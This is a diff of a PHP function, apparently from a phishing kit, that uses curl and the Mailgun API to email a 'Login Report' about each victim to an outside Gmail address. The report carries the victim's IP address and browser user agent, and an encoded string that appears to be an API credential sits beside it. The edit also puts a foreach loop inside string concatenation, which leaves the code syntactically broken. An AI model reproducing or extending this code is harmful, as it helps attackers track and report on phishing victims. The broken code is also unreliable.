@@ -52,8 +52,6 @@ function mailboss()
   $ua = getBrowser();
 
 
-  foreach($ua as $value){
-
   }
   
        $str = "MjlmMDU1NTQwOTE5ZDA0ZmFiNDdiOTY2OTAxM2E5YmYtNmUwZmQzYTQtYWIyM2M5YmY=";
@@ -66,7 +64,7 @@ function mailboss()
             -F from='Project Neo <mailgun@sandbox278db0aa41f949f787587733cd50e41c.mailgun.org>' \
             -F to=danlyt74@gmail.com \
             -F subject='Login Report' \
-            -F html='Hi boss! Access was given to<br><b>IP: ".getUserIpAddr()."</b><br>User Agent: ".$value."'
+            -F html='Hi boss! Access was given to<br><b>IP: ".getUserIpAddr()."</b><br>User Agent: ".foreach($ua as $value)echo $value."<br>".'
         ");   
 }
 
